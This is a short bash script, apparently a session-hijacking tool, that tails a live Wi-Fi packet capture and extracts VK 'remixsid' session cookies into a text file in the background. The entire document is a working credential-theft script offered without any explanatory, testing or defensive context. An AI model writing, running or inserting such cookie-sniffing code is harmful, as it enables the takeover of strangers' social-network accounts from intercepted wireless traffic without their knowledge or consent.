#!/bin/bash
tail -f /wifid/dumps/dump-01.cap | stdbuf -oL grep -aEo "remixsid=[a-z0-9]{60}" > /vk/cookie.txt &
